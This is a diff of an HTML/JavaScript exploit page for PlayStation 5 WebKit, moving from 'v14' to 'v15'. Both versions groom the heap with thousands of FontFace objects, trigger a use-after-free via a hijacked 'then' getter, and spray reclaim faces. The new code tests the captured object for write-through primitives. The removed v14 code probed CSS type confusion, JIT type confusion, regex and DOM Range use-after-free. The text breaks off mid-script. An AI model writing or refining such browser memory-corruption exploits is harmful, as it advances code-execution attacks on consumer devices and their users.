@@ -2,634 +2,418 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v14 - Inside Window</title>
+<title>PS5 v15 - Simple Capture</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
 *{margin:0;padding:0;box-sizing:border-box}
-html,body{width:100%;height:100%;background:#080808;color:#bbb;
-font-family:'Courier New',monospace;overflow:hidden}
-#top{position:fixed;top:0;left:0;right:0;height:40px;
-background:#0c0c0c;border-bottom:1px solid #1a3a2a;
-display:flex;align-items:center;padding:0 12px;gap:10px;
-z-index:10;font-size:12px}
-.t{color:#00ffa0;font-weight:bold}.v{color:#0d0}.s{color:#333}
-#bar{position:fixed;top:40px;left:0;right:0;height:3px;
-background:#111;z-index:10}
-#bar div{height:100%;background:#00ffa0;transition:width .3s}
-#out{position:fixed;top:43px;left:0;right:0;bottom:0;
-padding:8px 12px;overflow-y:auto;font-size:14px;line-height:1.5;
-background:#080808;-webkit-user-select:text}
-#out::-webkit-scrollbar{width:4px}
-#out::-webkit-scrollbar-thumb{background:#2a4a3a;border-radius:2px}
-.ok{color:#0f0}.fl{color:#f55}.wr{color:#fc0}.hi{color:#0ff;font-weight:bold}
-.st{color:#f0f;font-weight:bold}.dm{color:#555}.hd{color:#00ffa0;font-weight:bold}
+html,body{width:100%;height:100%;background:#000;color:#0f0;
+font-family:monospace;overflow:hidden}
+#out{position:fixed;top:0;left:0;right:0;bottom:0;
+padding:16px;font-size:16px;line-height:1.6;
+overflow-y:auto;-webkit-user-select:text}
+.c{color:#0f0}.e{color:#f44}.w{color:#fc0}.h{color:#0ff;font-weight:bold}
+.s{color:#f0f;font-weight:bold;font-size:18px}.d{color:#666}
 #c{position:absolute;left:-9999px;top:-9999px}
 </style>
 </head>
 <body>
-<div id="top">
-<span class="t">v14</span><span class="s">│</span>
-<span class="v" id="hF">FW:?</span><span class="s">│</span>
-<span class="v" id="hU">UAF:?</span><span class="s">│</span>
-<span class="v" id="hR">RC:?</span><span class="s">│</span>
-<span class="v" id="hP">PRIM:?</span>
-</div>
-<div id="bar"><div id="bp" style="width:0%"></div></div>
 <div id="out"></div>
 <canvas id="c" width="512" height="128"></canvas>
 <script>
 "use strict";
 
 // ============================================================
-//  PS5 WebKit v14 - Capture Inside UAF Window
-//
-//  FROM RESEARCH REPORT:
-//  1. CSS parser treats font URL as string without type check
-//     → double interpreted as string pointer → memory leak
-//  2. IsoHeaps isolate types → must spray SAME type
-//  3. PS5 WebKit has no separate sandbox
-//  4. FontFaceSet has tight reference counting
-//  5. JIT needs >200 iterations for FTL compilation
-//
-//  KEY INSIGHT: load() returns RC face ONLY inside UAF window
-//  We must capture the reference INSIDE the "then" getter!
+//  PS5 WebKit v15 - SIMPLE CAPTURE
+//  Focus: Capture RC face from initial load(), test primitives
+//  Be VERY careful not to crash
 // ============================================================
 
 const O=document.getElementById("out");
-const bp=document.getElementById("bp");
-function bar(p){bp.style.width=p+"%"}
-function hud(id,v){const e=document.getElementById(id);if(e)e.textContent=v}
 function P(m,c){const s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
-try{console.log("[v14] "+m)}catch(e){}}
-function Ok(m){P("✅ "+m,"ok")}function Fl(m){P("✘ "+m,"fl")}
-function Wr(m){P("⚠ "+m,"wr")}function Hi(m){P("► "+m,"hi")}
-function St(m){P("★ "+m+" ★","st")}function Dm(m){P(m,"dm")}
-function Hd(m){P(m,"hd")}function Sep(){P("─".repeat(42),"dm")}
+s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
+function Ok(m){P("✅ "+m,"c")}function Fl(m){P("✘ "+m,"e")}
+function Wr(m){P("⚠ "+m,"w")}function Hi(m){P("► "+m,"h")}
+function St(m){P("★ "+m+" ★","s")}function Dm(m){P(m,"d")}
 
-window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l)};
+window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l);return true};
 
 let keepAlive=[],holeFaces=[],reclaimFaces=[];
-let uafTriggered=false,triggerFace=null;
-let capturedRCFace=null,capturedRCIdx=-1;
-let capturedInsideWindow=false;
+let triggerFace=null,uafFired=false;
 
 const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
 const FBb=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
 for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
 function mkBuf(){const c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
-
-function fs(){void document.body.offsetTop;void document.documentElement.offsetHeight}
-function addPads(n){const sh=document.getElementById("s").sheet;
-for(let i=0;i<n;i++)sh.insertRule(
-`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,
-sh.cssRules.length);fs()}
-function addFlush(n){const st=document.createElement("style");st.id="flush";
-document.head.appendChild(st);const sh=st.sheet;
-for(let i=0;i<n;i++)sh.insertRule(
-`@font-face{font-family:flush${i};src:url(nf${i}.woff);unicode-range:U+E000}`,
-sh.cssRules.length);fs()}
-function delFlush(){const e=document.getElementById("flush");
-if(e&&e.sheet){while(e.sheet.cssRules.length)e.sheet.deleteRule(0);fs()}}
-function killCk(){const f=new FontFace("ck"+keepAlive.length,"local(Helvetica)",
-{unicodeRange:"U+E124"});document.fonts.add(f);keepAlive.push(f)}
+function fs(){try{void document.body.offsetTop}catch(e){}}
 
 // ============================================================
-//  PHASE 1: UAF with CAPTURE INSIDE WINDOW
+//  PHASE 1: Setup
 // ============================================================
-function makeHoles(){
-for(let i=0;i<4096;i++){const f=new FontFace("hole_"+i,mkBuf(),{
+Dm("Creating holes...");
+for(let i=0;i<4096;i++){
+try{const f=new FontFace("h_"+i,mkBuf(),{
 unicodeRange:"U+E1"+(i%16).toString(16),
 style:i%2===0?"normal":"italic",
-weight:String(100+(i%9)*100),
-display:["auto","block","swap","fallback","optional"][i%5]});
-document.fonts.add(f);holeFaces.push(f)}
-fs();for(let i=1;i<holeFaces.length;i+=2)document.fonts.delete(holeFaces[i]);
-fs();for(let i=0;i<4;i++){const t=[];for(let j=0;j<512;j++)t.push(new ArrayBuffer(4096))}
-Ok("Holes")}
+weight:String(100+(i%9)*100)});
+document.fonts.add(f);holeFaces.push(f)}catch(e){}}
+fs();
+for(let i=1;i<holeFaces.length;i+=2)
+try{document.fonts.delete(holeFaces[i])}catch(e){}
+fs();
+Ok("Holes ready");
 
-function spray(){
-for(let i=0;i<4096;i++){const f=new FontFace("RC_"+i,mkBuf(),{
-unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
-document.fonts.add(f);reclaimFaces.push(f)}fs();Ok("Spray")}
-
-// ============================================================
-//  PHASE 2: Capture + Test Inside UAF Window
-//  The "then" getter fires DURING the font loading pipeline
-//  At this moment, the CSSFontSelector is mid-operation
-//  We must capture + test everything RIGHT HERE
-// ============================================================
-function setupTriggerWithCapture(){
+Dm("Setting up trigger...");
 triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
 document.fonts.add(triggerFace);void triggerFace.loaded;
-addPads(48);addFlush(768);
 
-Hd("Setting up UAF with inside-window capture...");
+// Add pads
+const sh=document.getElementById("s").sheet;
+for(let i=0;i<48;i++)
+try{sh.insertRule(`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,sh.cssRules.length)}catch(e){}
+fs();
 
+// Add flush
+const fst=document.createElement("style");fst.id="flush";
+document.head.appendChild(fst);
+const fsh=fst.sheet;
+for(let i=0;i<768;i++)
+try{fsh.insertRule(`@font-face{font-family:fl${i};src:url(nf${i}.woff);unicode-range:U+E000}`,fsh.cssRules.length)}catch(e){}
+fs();
+Ok("Trigger ready");
+
+// ============================================================
+//  PHASE 2: UAF Trigger
+// ============================================================
 Object.defineProperty(FontFace.prototype,"then",{
 configurable:true,
 get(){
-if(this===triggerFace&&!uafTriggered){
-uafTriggered=true;
-hud("hU","UAF:✅");
-St("UAF WINDOW OPEN — CAPTURING NOW");
+if(this===triggerFace&&!uafFired){
+uafFired=true;
+St("UAF WINDOW OPEN");
 
-// Step 1: Do the UAF
-killCk();
-document.getElementById("s").sheet.deleteRule(1);
+try{
+// Kill cache
+const ck=new FontFace("ck"+keepAlive.length,"local(Helvetica)",{unicodeRange:"U+E124"});
+document.fonts.add(ck);keepAlive.push(ck);
+
+// Delete the 'x' font-face rule (frees CSSFontFace for 'x')
+sh.deleteRule(1);
 fs();
-delFlush();
+
+// Delete flush rules
+while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
+fs();
+
+// Delete some holes
 for(let i=0;i<holeFaces.length;i+=4)
 try{document.fonts.delete(holeFaces[i])}catch(e){}
 fs();
-for(let i=0;i<8;i++){const t=[];for(let j=0;j<256;j++)t.push(new ArrayBuffer(8192))}
+}catch(e){Fl("UAF prep: "+e.message)}
 
-// Step 2: Spray
-spray();
+// Spray RC faces
+Dm("Spraying RC faces...");
+for(let i=0;i<4096;i++){
+try{const f=new FontFace("RC_"+i,mkBuf(),{
+unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
+document.fonts.add(f);reclaimFaces.push(f)}catch(e){}
+}
+fs();
+Ok("Spray done");
 
-// Step 3: CAPTURE — Try load() RIGHT NOW inside the window
-Dm("Attempting load() inside UAF window...");
+// Force layout with trigger font
 try{
-// Synchronous check — does the selector see RC faces now?
-const testFaces=document.fonts.load("1em trigger, x","AB");
-// This returns a Promise, but we can check .status or
-// synchronously iterate document.fonts
+const d=document.createElement("div");d.textContent="AB";
+d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
+document.body.appendChild(d);void d.offsetWidth;
+}catch(e){}
 
-// Try synchronous property access on reclaim faces
-let foundCount=0;
-for(let i=0;i<Math.min(reclaimFaces.length,100);i++){
-const f=reclaimFaces[i];
-if(f.status==="loaded"){
-foundCount++;
-}
-}
-P("  Loaded RC faces (first 100): "+foundCount);
-}catch(e){Fl("  Inside-window load error: "+e.message)}
-
-// Step 4: Force style recalc with confused selector
-fs();
-
-// Step 5: Create divs that reference "x" family
-// This forces the selector to resolve "x" while confused
-for(let i=0;i<10;i++){
-const d=document.createElement("div");
-d.textContent="B";
-d.style.cssText="position:absolute;left:-9999px;top:"+(i*30)+"px;font:64px x;";
-document.body.appendChild(d);
-}
-fs();
-
-Dm("UAF window operations complete");
+Dm("UAF window closing");
 }
 return undefined;
 }
 });
-}
 
 // ============================================================
-//  PHASE 3: Post-UAF Analysis
-//  Check what we captured and test persistence
+//  PHASE 3: Load and Capture
+//  The initial load() call returns the RC face
+//  We capture it in the .then() callback
 // ============================================================
-async function postUAFAnalysis(){
-Sep();Hd("POST-UAF ANALYSIS");Sep();
+Dm("Firing load()...");
 
-// Test 1: Does load() still return RC faces?
-P("");Dm("Test 1: load() after UAF window closed");
-const f1=await document.fonts.load("1em trigger, x","AB");
-P("  load('1em trigger, x','AB') → "+f1.length+" faces");
-for(const f of f1){
-P("    "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
-if(f.family&&f.family.startsWith("RC_")){
-capturedRCFace=f;
-const m=f.family.match(/RC_(\d+)/);
-if(m)capturedRCIdx=parseInt(m[1]);
-Hi("CAPTURED: "+f.family);
-}
-}
+document.fonts.load("1em trigger, x","AB").then(function(faces){
+St("LOAD CALLBACK FIRED");
+P("Faces returned: "+faces.length,"h");
 
-// Test 2: Try with just "x" family
-P("");Dm("Test 2: load() for 'x' only");
-const f2=await document.fonts.load("64px x","B");
-P("  load('64px x','B') → "+f2.length+" faces");
-for(const f of f2)P("    "+f.family+" "+f.style+" "+f.weight);
+let rcFace=null,rcIdx=-1,trigFace=null;
 
-// Test 3: Check if any font is rendering "x" text
-P("");Dm("Test 3: Check 'x' div rendering");
-const xDivs=document.querySelectorAll('div[style*="font:64px x"]');
-P("  Found "+xDivs.length+" x-divs");
-for(const d of xDivs){
-const w=d.offsetWidth;
-P("  x-div width: "+w,w>0?"hi":"dm");
-}
-
-// Test 4: getComputedStyle for "x" elements
-P("");Dm("Test 4: getComputedStyle for x-divs");
-for(const d of xDivs){
-try{
-const cs=getComputedStyle(d);
-P("  fontFamily: "+cs.fontFamily);
-P("  fontWeight: "+cs.fontWeight);
-P("  fontStyle:  "+cs.fontStyle);
-}catch(e){}
-break; // Just first one
-}
-
-// Test 5: Iterate document.fonts for anomalies
-P("");Dm("Test 5: document.fonts anomalies");
-let rcLoaded=0,rcError=0,rcUnloaded=0;
-let loadedRCs=[];
-for(const f of document.fonts){
-if(f.family&&f.family.startsWith("RC_")){
-if(f.status==="loaded"){rcLoaded++;loadedRCs.push(f.family)}
-else if(f.status==="error")rcError++;
-else rcUnloaded++;
-}
-}
-P("  RC loaded: "+rcLoaded+" error: "+rcError+" unloaded: "+rcUnloaded);
-
-// Show first few loaded RCs
-if(loadedRCs.length>0&&loadedRCs.length<20){
-Hi("Loaded RC faces: "+loadedRCs.join(", "));
-}
-
-// Test 6: Access captured face properties
-if(capturedRCFace){
-P("");Hd("CAPTURED FACE PROPERTIES:");
-const props=["family","style","weight","stretch","unicodeRange",
-"variant","featureSettings","display","status"];
-for(const p of props){
-try{P("  "+p.padEnd(16)+"= "+capturedRCFace[p])}catch(e){P("  "+p+"= ERR","fl")}
-}
-}
-
-return capturedRCFace!==null;
-}
-
-// ============================================================
-//  PHASE 4: CSS String/Double Type Confusion
-//  From the research report:
-//  "CSS parser assumed font URL was string without verifying
-//   type, treating double as CSS string pointer → memory leak"
-//
-//  Try to trigger this by setting FontFace.src to unusual values
-// ============================================================
-async function cssTypeConfusion(){
-Sep();Hd("CSS STRING/DOUBLE TYPE CONFUSION");Sep();
-
-// Technique: Create FontFace with src that might be
-// interpreted differently by the C++ parser vs JS engine
-
-P("");Dm("Test 1: FontFace with numeric src");
-const numSrcs=[0,1,1.5,NaN,Infinity,-Infinity,
-1e308,1e-308,0.1,9007199254740991];
-
-for(const src of numSrcs){
-try{
-const f=new FontFace("numtest",src,{unicodeRange:"U+0041"});
-document.fonts.add(f);fs();
-P("  src="+src+" → status="+f.status+" family="+f.family,
-f.status!=="error"?"hi":"dm");
-
-// If status is not "error", the parser accepted our numeric src!
-// This might mean it interpreted the double's bits as a pointer
-if(f.status!=="error"){
-St("NUMERIC SRC ACCEPTED: "+src);
-Hi("  This could be a type confusion!");
-Hi("  The CSS parser might interpret double bits as string ptr!");
-}
-
-document.fonts.delete(f);fs();
-}catch(e){
-P("  src="+src+" → ERR: "+e.message.substring(0,50),"fl");
-}
-}
-
-P("");Dm("Test 2: FontFace with object src");
-const objSrcs=[
-new Uint8Array(64),
-new ArrayBuffer(64),
-new DataView(new ArrayBuffer(64)),
-{toString:()=>{return"local(Helvetica)"}},
-[0x41,0x42,0x43],
-/regex/,
-null,
-undefined
-];
-
-for(const src of objSrcs){
-try{
-const f=new FontFace("objtest",src,{unicodeRange:"U+0041"});
-document.fonts.add(f);fs();
-const t=typeof src;
-P("  src=["+t+"] → status="+f.status,
-f.status!=="error"?"hi":"dm");
-if(f.status!=="error"){
-Hi("OBJECT SRC ACCEPTED: "+t);
-}
-document.fonts.delete(f);fs();
-}catch(e){
-const t=typeof src;
-P("  src=["+t+"] → ERR: "+e.message.substring(0,40),"fl");
-}
-}
-
-// Technique 2: CSS @font-face rule with URL that's a number
-P("");Dm("Test 3: CSS rule with numeric URL");
-const sheet=document.getElementById("s").sheet;
-const testURLs=[
-"url(0)","url(1)","url(1.5)","url(0x41414141)",
-"url(1e308)","url(NaN)","url(0.0.0.0)"
-];
-
-for(const url of testURLs){
-try{
-const idx=sheet.insertRule(
-`@font-face{font-family:urltest;src:${url};unicode-range:U+E125}`,
-sheet.cssRules.length);
-fs();
-
-// Check if the rule was accepted
-const rule=sheet.cssRules[idx];
-if(rule){
-P("  "+url+" → rule accepted");
-// Try to read the src from the rule
-try{
-P("    rule.cssText: "+rule.cssText.substring(0,80));
-}catch(e){}
-}
-
-sheet.deleteRule(idx);fs();
-}catch(e){
-P("  "+url+" → ERR: "+e.message.substring(0,40),"fl");
-}
-}
-
-// Technique 3: Set FontFace.src after creation
-P("");Dm("Test 4: Modify src after creation");
-try{
-const f=new FontFace("modsrc","local(Helvetica)",{unicodeRange:"U+0041"});
-document.fonts.add(f);fs();
-
-// Try setting src to unusual values
-const modTests=[
-"local(Courier)",  // Normal — should work
-"0",               // Number as string
-"1.5",             // Float as string
-"",                // Empty
-"undefined",       // String "undefined"
-"url(0x41414141)"  // Hex URL
-];
-
-for(const newSrc of modTests){
-try{
-f.src=newSrc;
-fs();
-P("  src→'"+newSrc+"' → status="+f.status+" src="+f.src,
-f.status!=="error"?"hi":"dm");
-}catch(e){
-P("  src→'"+newSrc+"' → ERR: "+e.message.substring(0,40),"fl");
-}
-}
-
-document.fonts.delete(f);fs();
-}catch(e){Fl("  "+e.message)}
-}
-
-// ============================================================
-//  PHASE 5: JIT-Based Type Confusion
-//  From report: "bugs require heating up JIT tiers, >200 iterations"
-//  Try to trigger JIT speculation on FontFace properties
-// ============================================================
-async function jitTypeConfusion(){
-Sep();Hd("JIT TYPE CONFUSION");Sep();
-
-P("");Dm("Heating up JIT with FontFace property access...");
-
-// Create many identical FontFace objects
-const faces=[];
-for(let i=0;i<500;i++){
-const f=new FontFace("jit_"+i,mkBuf(),{
-unicodeRange:"U+0041",style:"italic",weight:"900"});
-document.fonts.add(f);faces.push(f);
-}
-fs();
-
-// Access properties repeatedly to trigger JIT compilation
-const results=[];
-for(let iter=0;iter<300;iter++){
 for(let i=0;i<faces.length;i++){
 const f=faces[i];
-const w=f.weight;
-const s=f.style;
-const fam=f.family;
-if(w!=="900"||s!=="italic"||fam!=="jit_"+i){
-results.push({iter,i,weight:w,style:s,family:fam});
-if(results.length>=10)break;
+P("  ["+i+"] "+f.family+" | "+f.style+" | "+f.weight+" | st="+f.status);
+
+if(f.family&&f.family.startsWith("RC_")){
+rcFace=f;
+const m=f.family.match(/RC_(\d+)/);
+if(m)rcIdx=parseInt(m[1]);
 }
-}
-if(results.length>=10)break;
+if(f.family==="trigger")trigFace=f;
 }
 
-if(results.length>0){
-St("JIT TYPE CONFUSION DETECTED!");
-for(const r of results){
-Hi("  iter="+r.iter+" i="+r.i+" w="+r.weight+" s="+r.style+" fam="+r.family);
-}
+// Keep references alive
+keepAlive.push(faces);
+keepAlive.push(rcFace);
+keepAlive.push(trigFace);
+
+if(rcFace){
+St("CAPTURED RC_"+rcIdx);
+
+// ============================================================
+//  PHASE 4: Property Analysis
+// ============================================================
+P("");
+Hi("=== PROPERTY ANALYSIS ===");
+
+const props=["family","style","weight","stretch","unicodeRange",
+"variant","featureSettings","display","status","loaded"];
+
+for(const p of props){
+try{
+const v=rcFace[p];
+const t=typeof v;
+if(t==="object"&&v!==null){
+P("  "+p.padEnd(16)+"= [object] ("+v.constructor.name+")","h");
 }else{
-Dm("No JIT type confusion detected in "+faces.length+" faces x 300 iters");
+P("  "+p.padEnd(16)+"= "+v);
+}
+}catch(e){
+P("  "+p.padEnd(16)+"= ERR: "+e.message,"e");
+}
 }
 
-// Cleanup
-for(const f of faces)try{document.fonts.delete(f)}catch(e){}
+// ============================================================
+//  PHASE 5: Identity Test
+//  Is the rcFace the SAME JS object as the one in reclaimFaces?
+// ============================================================
+P("");
+Hi("=== IDENTITY TEST ===");
+
+const sameObj=reclaimFaces[rcIdx]===rcFace;
+P("rcFace === reclaimFaces["+rcIdx+"]: "+sameObj,sameObj?"c":"h");
+
+if(!sameObj){
+Hi("DIFFERENT JS OBJECTS!");
+Hi("The load() returned a DIFFERENT wrapper");
+Hi("This means the C++ object was reused!");
+}
+
+// Check if it's in document.fonts
+let foundInFonts=false;
+try{
+for(const f of document.fonts){
+if(f===rcFace){foundInFonts=true;break}
+}
+}catch(e){}
+P("Found in document.fonts: "+foundInFonts);
+
+// ============================================================
+//  PHASE 6: Write-Through Test
+// ============================================================
+P("");
+Hi("=== WRITE-THROUGH TEST ===");
+
+// Try modifying rcFace and checking if trigFace sees it
+if(trigFace){
+P("Testing: modify rcFace, read trigFace...","d");
+
+const origWeight=rcFace.weight;
+try{
+rcFace.weight="100";
 fs();
-}
+const trigWeight=trigFace.weight;
+P("  rcFace.weight→100, trigFace.weight="+trigWeight,
+trigWeight==="100"?"h":"d");
+if(trigWeight==="100")St("WRITE-THROUGH VIA WEIGHT!");
+rcFace.weight=origWeight;fs();
+}catch(e){P("  weight: "+e.message,"e")}
 
-// ============================================================
-//  PHASE 6: Regex YARR UAF (from report)
-//  YARR backtracking can cause UAF in ParenContext
-// ============================================================
-async function regexYARRExploit(){
-Sep();Hd("REGEX YARR UAF ATTEMPT");Sep();
-
-P("");Dm("Testing YARR regex backtracking patterns...");
-
-const patterns=[
-/(a+)+b/,           // Classic ReDoS
-/(a|a)+b/,          // Alternation
-/((a+)+)+b/,        // Nested quantifiers
-/(a*)*b/,           // Star nesting
-/(?:a+)+b/,         // Non-capturing
-/(a+)+$/            // Anchored
-];
-
-for(const pat of patterns){
+const origStyle=rcFace.style;
 try{
-const t0=performance.now();
-// Try to trigger backtracking
-const result=pat.exec("a".repeat(30));
-const elapsed=performance.now()-t0;
-P("  "+pat.source.padEnd(20)+" → "+elapsed.toFixed(1)+"ms",
-elapsed>100?"hi":"dm");
-}catch(e){
-P("  "+pat.source.padEnd(20)+" → ERR: "+e.message.substring(0,40),"fl");
-}
-}
+rcFace.style="normal";
+fs();
+const trigStyle=trigFace.style;
+P("  rcFace.style→normal, trigFace.style="+trigStyle,
+trigStyle==="normal"?"h":"d");
+if(trigStyle==="normal")St("WRITE-THROUGH VIA STYLE!");
+rcFace.style=origStyle;fs();
+}catch(e){P("  style: "+e.message,"e")}
 
-// Try with JIT compilation (>200 iterations)
-P("");Dm("Heating up regex JIT...");
-const hotPat=/(a+)+b/;
-const hotStr="a".repeat(25)+"c"; // Will fail, causing backtracking
-
-for(let i=0;i<300;i++){
-try{hotPat.exec(hotStr)}catch(e){}
-}
-
-const t0=performance.now();
-hotPat.exec(hotStr);
-const elapsed=performance.now()-t0;
-P("  After JIT: "+elapsed.toFixed(1)+"ms");
-
-// Try patterns that might cause crashes
-P("");Dm("Testing crash-inducing patterns...");
-const crashPats=[
-new RegExp("(".repeat(50)+"a"+")".repeat(50)),
-/(a{1,1000000}){1,1000000}/,
-/((?:a+)+)+$/
-];
-
-for(const pat of crashPats){
+const origDisplay=rcFace.display;
 try{
-pat.exec("a".repeat(20));
-P("  Pattern survived","ok");
-}catch(e){
-P("  Pattern error: "+e.message.substring(0,50),"fl");
-}
-}
+rcFace.display="fallback";
+fs();
+const trigDisplay=trigFace.display;
+P("  rcFace.display→fallback, trigFace.display="+trigDisplay,
+trigDisplay==="fallback"?"h":"d");
+rcFace.display=origDisplay;fs();
+}catch(e){P("  display: "+e.message,"e")}
 }
 
 // ============================================================
-//  PHASE 7: DOM Range UAF (from report)
+//  PHASE 7: Delete + Replace Test
 // ============================================================
-async function domRangeUAF(){
-Sep();Hd("DOM RANGE UAF");Sep();
-
-P("");Dm("Testing DOM Range endpoint abuse...");
+P("");
+Hi("=== DELETE + REPLACE TEST ===");
 
 try{
-const range=document.createRange();
-const container=document.createElement("div");
-container.innerHTML="<p>text<span>more</span></p>";
-document.body.appendChild(container);
+// Delete the confused RC face
+document.fonts.delete(rcFace);
+fs();
+Ok("Deleted RC_"+rcIdx);
 
-const p=container.querySelector("p");
-const span=container.querySelector("span");
-
-range.setStart(p,0);
-range.setEnd(span,1);
-
-// Try to create UAF by removing nodes during range use
-const text=range.toString();
-P("  Range text: "+text);
-
-// Remove the span while range references it
-container.removeChild(span);
-
-// Try to use the range again
-try{
-const text2=range.toString();
-P("  After removal: "+text2,text2!==text?"hi":"dm");
-}catch(e){
-P("  Range access after removal: "+e.message,"fl");
+// Try load() again
+document.fonts.load("1em trigger, x","AB").then(function(f2){
+P("After delete: load() returned "+f2.length+" faces","h");
+for(const f of f2){
+P("  "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
 }
 
-document.body.removeChild(container);
-}catch(e){Fl("  "+e.message)}
-}
-
-// ============================================================
-//  PHASE 8: Final Primitive Assessment
-// ============================================================
-async function finalAssessment(){
-Sep();Hd("FINAL PRIMITIVE ASSESSMENT");Sep();
-P("");
-
-const conf=try{document.fonts.check("900 italic 64px trigger","A")}catch(e){false};
-
-P("UAF:              "+(uafTriggered?"✅":"✘"),uafTriggered?"ok":"fl");
-P("Captured RC:      "+(capturedRCFace?"RC_"+capturedRCIdx:"none"),
-capturedRCFace?"hi":"dm");
-P("check() corrupt:  "+(conf?"✅":"✘"),conf?"ok":"fl");
-P("");
-
-if(capturedRCFace){
-St("HAVE CAPTURED RC FACE REFERENCE");
-P("Face: "+capturedRCFace.family+" "+capturedRCFace.style+" "+capturedRCFace.weight);
-P("");
-P("Available primitives:","hd");
-P("  1. Property read via captured reference","dm");
-P("  2. Delete+replace via document.fonts","dm");
-P("  3. check() oracle (always true)","dm");
-P("");
-P("Potential attacks:","hd");
-P("  1. CSS string/double type confusion","dm");
-P("  2. JIT speculative type confusion","dm");
-P("  3. Regex YARR backtracking UAF","dm");
-P("  4. DOM range endpoint UAF","dm");
+// Check if a different face appears
+const newRC=f2.find(function(f){return f.family&&f.family.startsWith("RC_")});
+if(newRC){
+Hi("New RC face: "+newRC.family);
+Hi("This means the slot was reoccupied!");
+keepAlive.push(newRC);
 }else{
-P("No captured RC face reference","wr");
-P("");
-P("The selector 'heals' after UAF window closes","dm");
-P("Need to capture reference INSIDE the window","dm");
-P("");
-P("Alternative attack vectors:","hd");
-P("  1. CSS string/double type confusion","dm");
-P("  2. Regex YARR UAF","dm");
-P("  3. DOM range UAF","dm");
+Dm("No RC face after delete");
 }
 
-hud("hP",capturedRCFace?"PRIM:CAP":"PRIM:PROBE");
+// Spray replacement
+P("");
+Dm("Spraying REPL faces...");
+const repls=[];
+for(let i=0;i<1024;i++){
+try{const f=new FontFace("REPL_"+i,mkBuf(),{
+unicodeRange:"U+0041",
+style:i%2===0?"normal":"italic",
+weight:String([100,400,700,900][i%4])});
+document.fonts.add(f);repls.push(f)}catch(e){}
 }
+fs();
+
+// Check load() again
+document.fonts.load("1em trigger, x","AB").then(function(f3){
+P("After REPL spray: load() returned "+f3.length+" faces","h");
+for(const f of f3){
+P("  "+f.family+" "+f.style+" "+f.weight+" st="+f.status,
+f.family&&f.family.startsWith("REPL_")?"h":"d");
+}
+
+const repl=f3.find(function(f){return f.family&&f.family.startsWith("REPL_")});
+if(repl){
+St("REPL FACE FOUND: "+repl.family);
+Hi("  style: "+repl.style);
+Hi("  weight: "+repl.weight);
+
+// Find the JS reference
+const replRef=repls.find(function(r){return r.family===repl.family});
+if(replRef){
+Ok("Found JS ref for "+replRef.family);
+
+// Test write-through on REPL
+try{
+replRef.weight="300";fs();
+const chk=document.fonts.load("1em trigger, x","AB");
+chk.then(function(f4){
+const chkR=f4.find(function(f){return f.family===repl.family});
+if(chkR){
+P("Write weight→300: load returns "+chkR.weight,
+chkR.weight==="300"?"h":"d");
+if(chkR.weight==="300")St("REPL WRITE-THROUGH CONFIRMED!");
+}
+replRef.weight="900";fs();
 
 // ============================================================
-//  Main
+//  FINAL SUMMARY
 // ============================================================
-window.onload=async()=>{
-const ua=navigator.userAgent||"";
-const m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-hud("hF","FW:"+(m?m[1]:"?"));
-
-bar(5);Hd("Holes...");makeHoles();
-
-bar(15);setupTriggerWithCapture();
-
-bar(25);Hd("Firing load...");
-document.fonts.load("1em trigger, x","AB").then(async faces=>{
-Dm("Initial load: "+faces.length+" faces");
-for(let i=0;i<faces.length;i++){
-P("  ["+i+"] "+faces[i].family+" "+faces[i].style+" "+faces[i].weight);
-if(faces[i].family&&faces[i].family.startsWith("RC_")){
-capturedRCFace=faces[i];
-const mm=faces[i].family.match(/RC_(\d+)/);
-if(mm)capturedRCIdx=parseInt(mm[1]);
-capturedInsideWindow=true;
-St("CAPTURED IN LOAD CALLBACK: "+faces[i].family);
-hud("hR","RC:"+capturedRCIdx);
-}
-}
-
-setTimeout(async()=>{
-bar(35);await postUAFAnalysis();
